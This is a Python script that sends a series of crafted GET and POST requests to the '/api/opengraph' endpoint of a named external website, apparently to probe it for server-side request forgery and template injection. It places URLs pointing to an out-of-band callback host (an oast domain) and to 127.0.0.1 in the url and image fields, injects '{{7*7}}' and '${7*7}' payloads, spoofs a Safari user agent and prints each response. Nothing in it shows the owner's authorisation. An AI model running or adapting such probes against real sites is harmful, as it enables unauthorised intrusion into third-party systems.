import requests, json, time
B="https://www.infinitycapital.bh"
H={"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15","Content-Type":"application/json"}
HOST="oob44a3f1b6c2d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
cases=[
 ("get","/api/opengraph"),
 ("get","/api/opengraph?url=http://example.com"),
 ("post_json",("/api/opengraph",{"url":"http://example.com"})),
 ("post_img",("/api/opengraph",{"image":"http://example.com"})),
 ("post_title",("/api/opengraph",{"title":"hello","description":"world"})),
 ("post_oob",("/api/opengraph",{"url":"http://"+HOST+"/og1.png"})),
 ("post_oob2",("/api/opengraph",{"image":"http://"+HOST+"/og2.png"})),
 ("post_both",("/api/opengraph",{"title":"t","url":"http://"+HOST+"/og3.png","image":"http://"+HOST+"/og4.png","description":"d"})),
 ("post_ssti",("/api/opengraph",{"title":"{{7*7}}","description":"${7*7}","url":"http://127.0.0.1/"})),
]
for kind,arg in cases:
    try:
        if kind=="get":
            r=requests.get(B+arg,headers=H,timeout=30,allow_redirects=False)
        else:
            r=requests.post(B+arg[0],headers=H,json=arg[1],timeout=30,allow_redirects=False)
        print(kind,arg if kind=="get" else arg[1], "->",r.status_code,len(r.content),r.headers.get('content-type'))
        print("    ",r.content[:300])
    except Exception as e: print(kind,arg,"ERR",repr(e))
    time.sleep(2)
